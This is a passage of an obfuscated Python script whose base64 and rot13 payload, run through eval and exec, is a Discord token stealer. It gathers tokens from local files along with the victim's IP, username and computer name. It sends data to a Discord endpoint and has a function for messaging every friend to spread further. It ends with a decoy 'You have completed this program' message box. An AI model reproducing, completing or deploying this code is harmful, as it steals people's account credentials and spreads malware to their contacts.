CAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgIGRlZiBzZW5kX21lc3NhZ2UodG9rZW4sIGNoYXRfaWQsIGZvcm1fZGF0YSk6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgdXJsb3BlbihSZXF1ZXN0KGYiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvY2hhbm5lbHMve2NoYXRfaWR9L21lc3NhZ2VzIiwgaGVhZGVycz1nZXRoZWFkZXJzKHRva2VuLCAibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMzI1NDE0NTM3MDMwMzI5MzIwMTUxMzk0ODQzNjg3IiksIGRhdGE9Zm9ybV9kYXRhLmVuY29kZSgpKSkucmVhZCgpLmRlY29kZSgpDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICBkZWYgc3ByZWFkKHRva2VuLCBmb3JtX2RhdGEsIGRlbGF5KToNCiAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgZm9yIGZyaWVuZCBpbiBnZXRmcmllbmRzKHRva2VuKToNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIGNoYXRfaWQgPSBnZXRjaGF0KHRva2VuLCBmcmllbmRbImlkIl0pDQogICAgICAgICAgICAgICAgICAgIHNlbmRfbWVzc2FnZSh0b2tlbiwgY2hhdF9pZCwgZm9ybV9kYXRhKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgIHNsZWVwKGRlbGF5KQ0KICAgICAgICBjYWNoZV9wYXRoID0gUk9BTUlORyArICJcXC5jYWNoZX4kIg0KICAgICAgICBlbWJlZHMgPSBbXQ0KICAgICAgICB3b3JraW5nID0gW10NCiAgICAgICAgY2hlY2tlZCA9IFtdDQogICAgICAgIGFscmVhZHlfY2FjaGVkX3Rva2VucyA9IFtdDQogICAgICAgIHdvcmtpbmdfaWRzID0gW10NCiAgICAgICAgaXAgPSBnZXRpcCgpDQogICAgICAgIHBjX3VzZXJuYW1lID0gb3MuZ2V0ZW52KCJVc2VyTmFtZSIpDQogICAgICAgIHBjX25hbWUgPSBvcy5nZXRlbnYoIkNPTVBVVEVSTkFNRSIpDQogICAgICAgIGZvciBwbGF0Zm9ybSwgcGF0aCBpbiBQQVRIUy5pdGVtcygpOg0KICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICBmb3IgdG9rZW4gaW4gZ2V0dG9rZW5zKHBhdGgpOg0KICAgICAgICAgICAgICAgIGlmIHRva2VuIGluIGNoZWNrZWQ6DQogICAgICAgICA'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
